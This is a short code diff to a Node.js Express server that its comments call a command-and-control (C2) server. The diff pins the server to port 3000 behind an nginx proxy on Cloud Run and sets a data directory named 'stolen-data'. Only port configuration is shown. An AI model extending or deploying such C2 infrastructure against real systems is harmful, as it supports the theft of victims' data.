@@ -16,8 +16,10 @@ const path = require('path')
 const cors = require('cors')
 
 const app = express()
-// Use PORT environment variable (Cloud Run requires 8080) or default to 3000 for local
-const PORT = process.env.PORT || 3000
+// C2 server always runs on port 3000 internally
+// nginx runs on port 8080 (Cloud Run's PORT) and proxies /c2 requests to this server
+// DO NOT use process.env.PORT here - that's for nginx
+const PORT = 3000
 const DATA_DIR = path.join(__dirname, 'stolen-data')
 
 // Middleware
